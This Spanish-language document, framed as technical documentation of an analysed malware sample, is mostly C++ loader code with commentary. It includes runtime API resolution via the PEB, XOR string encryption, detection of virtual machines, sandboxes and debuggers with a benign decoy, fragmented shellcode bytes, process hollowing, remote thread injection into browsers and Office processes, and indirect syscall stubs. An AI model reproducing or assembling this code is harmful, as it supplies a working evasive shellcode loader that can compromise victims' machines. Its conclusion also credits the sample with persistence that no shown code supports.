

# Documentación Técnica del Malware

## Arquitectura General

El malware analizado está diseñado con una arquitectura modular que permite una alta evasión de sistemas de detección y análisis. Su estructura se compone de varios componentes clave:

### 1. Estructura de Carga Dinámica de APIs
```cpp
struct APIAddresses {
    // kernel32.dll
    HMODULE(WINAPI *LoadLibraryA)(LPCSTR);
    FARPROC(WINAPI *GetProcAddress)(HMODULE, LPCSTR);
    // ... más APIs
};
```

Esta estructura almacena punteros a funciones críticas del sistema que se resuelven dinámicamente durante la ejecución, evitando así la detección estática de importaciones.

### 2. Sistema de Ofuscación
El malware implementa un sistema de ofuscación basado en XOR para:
- Cadenas de texto
- Shellcode
- Nombres de funciones y procesos

```cpp
constexpr std::array<unsigned char, 16> encryptionKeyTC = {
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11, 0x22,
    0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99
};

template <size_t N>
class EncryptedString {
    // Implementación de cadenas encriptadas en tiempo de compilación
};
```

### 3. Módulo Anti-Análisis
Implementa múltiples técnicas para detectar y evadir entornos de análisis:
- Detección de máquinas virtuales
- Detección de sandboxes
- Detección de depuradores
- Detección de hooks de API

## Workflow de Ejecución

El flujo de ejecución del malware sigue una secuencia cuidadosamente diseñada para maximizar su efectividad y evasión:

### 1. Inicialización
```cpp
int main() {
    // Inicializar las APIs
    if (!InitializeAPIs()) {
        std::cout << "Error al inicializar las APIs" << std::endl;
        return 0;
    }
    // ...
}
```

El malware comienza cargando dinámicamente todas las APIs necesarias mediante la función `InitializeAPIs()`, que utiliza técnicas de resolución de símbolos sin llamar directamente a `GetProcAddress`.

### 2. Detección de Entorno Hostil
```cpp
if (IsRunningInVM() || IsRunningInSandbox() || APIs.IsDebuggerPresent() || 
    CheckRemoteDebuggerPresent() || DetectAPIHooks()) {
    // Si estamos en un entorno de análisis, ejecutar codigo benigno
    APIs.MessageBoxA(NULL, "Hola Mundo", "Mensaje", MB_OK);
    return 0;
}
```

Realiza una serie de comprobaciones para determinar si se está ejecutando en un entorno de análisis. Si detecta alguna anomalía, ejecuta código benigno para evitar la detección.

### 3. Retraso Anti-Sandbox
```cpp
AntiSandboxDelay();
```

Implementa un retraso variable en la ejecución para evadir análisis automatizados de sandboxes, que suelen tener límites de tiempo.

### 4. Preparación del Payload
```cpp
// Combinar partes del shellcode
unsigned char* combinedShellcode = new unsigned char[shellcodeSize];
CombineShellcode(combinedShellcode);

// Encriptar el shellcode combinado
XorCrypt(combinedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
```

Combina las múltiples partes del shellcode y lo encripta para evitar su detección.

### 5. Inyección del Payload
El malware implementa múltiples técnicas de inyección, intentándolas en orden:

#### 5.1 Process Hollowing
```cpp
if (ProcessHollowing(combinedShellcode, shellcodeSize)){
    std::cout << "PH completado" << std::endl;
    return 0;
}
```

La técnica más sofisticada que utiliza es el Process Hollowing, que consiste en:
1. Crear un proceso legítimo en estado suspendido
2. Vaciar su espacio de memoria
3. Reemplazarlo con el payload malicioso
4. Modificar el punto de entrada
5. Reanudar la ejecución

#### 5.2 Inyección en Proceso Remoto
```cpp
if (InjectIntoProcess(combinedShellcode, shellcodeSize)) {
    std::cout << "Inyeccion completada" << std::endl;
    delete[] combinedShellcode;
    return 0;
}
```

Si el Process Hollowing falla, intenta inyectar el código en procesos legítimos en ejecución como notepad.exe, mspaint.exe, etc.

#### 5.3 Ejecución Local
```cpp
// Si falla la inyeccion, usar técnica de memoria local
SIZE_T size = shellcodeSize;
LPVOID memory = NULL;

// Asignar memoria usando syscall indirecta
NTSTATUS status = APIs.NtAllocateVirtualMemory(GetCurrentProcess(), &memory, 0, &size, 
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Como último recurso, ejecuta el payload en el espacio de memoria del propio proceso.

## Técnicas Utilizadas

### 1. Ofuscación y Evasión

#### 1.1 Encriptación de Cadenas
Utiliza un sistema de encriptación XOR para cadenas de texto, evitando que los análisis estáticos detecten strings sospechosos.

```cpp
#define ENC_STR(str) []() { \
    constexpr auto encrypted = encrypt_string(str, sizeof(str) - 1); \
    constexpr EncryptedString<encrypted.size()> es(encrypted); \
    return es; \
}()
```

#### 1.2 Shellcode Fragmentado
El shellcode está dividido en 22 partes diferentes para evadir firmas antivirus:

```cpp
unsigned char part1[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41 };
unsigned char part2[] = { 0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60 };
// ... más partes
```

#### 1.3 Carga Dinámica de APIs
Evita usar importaciones estáticas, resolviendo las funciones en tiempo de ejecución:

```cpp
HMODULE GetModuleBaseAddress(const char* moduleName) {
    // Obtiene el PEB del proceso actual
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    // ...
}
```

### 2. Técnicas Anti-Análisis

#### 2.1 Detección de Máquinas Virtuales
```cpp
bool IsRunningInVM() {
    // Verificar número de procesadores
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }
    
    // Verificar cantidad de RAM
    if (memStatus.ullTotalPhys < 2147483648ULL) { // 2GB
        return true;
    }
    
    // Verificar dispositivos virtuales comunes
    if (strstr(buffer, ENC_STR("VBOX")) || 
        strstr(buffer, ENC_STR("VMWARE")) || 
        strstr(buffer, ENC_STR("VIRTUAL")) || 
        // ...
}
```

#### 2.2 Detección de Sandboxes
```cpp
bool IsRunningInSandbox() {
    // Verificar tiempo de actividad del sistema
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // Menos de 10 minutos
        return true;
    }
    
    // Verificar procesos relacionados con análisis
    if (_stricmp(pe32.szExeFile, ENC_STR("procexp.exe")) == 0 ||
        _stricmp(pe32.szExeFile, ENC_STR("wireshark.exe")) == 0 ||
        // ...
}
```

#### 2.3 Detección de Depuradores
```cpp
bool IsDebuggerPresentCustom() {
    return ::IsDebuggerPresent() != FALSE;
}

bool CheckRemoteDebuggerPresent() {
    HANDLE hProcess = GetCurrentProcess();
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &debuggerPresent);
    return debuggerPresent != FALSE;
}
```

### 3. Técnicas de Inyección

#### 3.1 Process Hollowing
Esta es la técnica más sofisticada implementada por el malware:

```cpp
bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
    // 1. Crear el proceso en estado suspendido
    if (!CreateProcessA(systemPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, 
                        NULL, NULL, &si, &pi)) {
        return false;
    }
    
    // 2. Obtener la dirección base de la imagen del proceso
    PVOID imageBaseAddress;
    if (!GetProcessImageBase(pi.hProcess, &imageBaseAddress)) {
        return false;
    }
    
    // 3. Leer la cabecera PE del proceso
    // ...
    
    // 4. Liberar la memoria del proceso original
    if (!VirtualFreeEx(pi.hProcess, imageBaseAddress, 0, MEM_RELEASE)) {
        return false;
    }
    
    // 5. Asignar nueva memoria para el shellcode
    pNewImageBase = VirtualAllocEx(pi.hProcess, imageBaseAddress, shellcodeSize, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 6. Escribir el shellcode en la memoria del proceso
    if (!WriteProcessMemory(pi.hProcess, pNewImageBase, decryptedShellcode, 
                           shellcodeSize, NULL)) {
        return false;
    }
    
    // 7. Modificar el contexto del hilo para apuntar al nuevo código
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    
#ifdef _WIN64
    context.Rcx = (DWORD64)pNewImageBase;
#else
    context.Eax = (DWORD)pNewImageBase;
#endif
    
    // 8. Actualizar el contexto del hilo
    SetThreadContext(pi.hThread, &context);
    
    // 9. Reanudar la ejecución del proceso
    ResumeThread(pi.hThread);
    
    return true;
}
```

#### 3.2 Inyección en Proceso Remoto
```cpp
bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
    // 1. Buscar procesos objetivo
    const char* targetProcesses[] = {
        "notepad.exe", "mspaint.exe", "write.exe", "winword.exe", "excel.exe",
        "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", 
    };
    
    // 2. Abrir el proceso con permisos adecuados
    process = APIs.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
                              PROCESS_CREATE_THREAD, FALSE, processEntry.th32ProcessID);
    
    // 3. Asignar memoria en el proceso remoto
    LPVOID remoteMem = APIs.VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, 
                                          PAGE_EXECUTE_READWRITE);
    
    // 4. Escribir shellcode en el proceso remoto
    APIs.WriteProcessMemory(process, remoteMem, decryptedShellcode, size, NULL);
    
    // 5. Crear hilo remoto para ejecutar el shellcode
    HANDLE thread = APIs.CreateRemoteThread(process, NULL, 0, 
                                           (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    
    return true;
}
```

### 4. Técnicas de Ejecución

#### 4.1 Syscall Indirectas
```cpp
NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAddress, 
                       ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    // Construir syscall stub dinámico
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscallNumber
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Insertar número de syscall
    *(DWORD*)(syscallStub + 5) = syscallNumber;
    
    // Ejecutar stub
    void* execMem = VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, 
                                PAGE_EXECUTE_READWRITE);
    memcpy(execMem, syscallStub, sizeof(syscallStub));
    
    typedef NTSTATUS(*SyscallFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    SyscallFunc syscallFunc = (SyscallFunc)execMem;
    result = syscallFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, 
                         AllocationType, Protect);
    
    VirtualFree(execMem, 0, MEM_RELEASE);
    return result;
}
```

## Conclusiones

El malware analizado representa una amenaza sofisticada que implementa múltiples técnicas de evasión y persistencia. Su arquitectura modular y su capacidad para adaptarse a diferentes entornos lo hacen particularmente difícil de detectar y analizar. Las técnicas de Process Hollowing y la carga dinámica de APIs son especialmente notables por su eficacia para evadir sistemas de detección.

La implementación de múltiples capas de ofuscación, junto con las técnicas anti-análisis, demuestran un alto nivel de conocimiento por parte de sus desarrolladores sobre el funcionamiento interno de Windows y las metodologías de análisis de malware.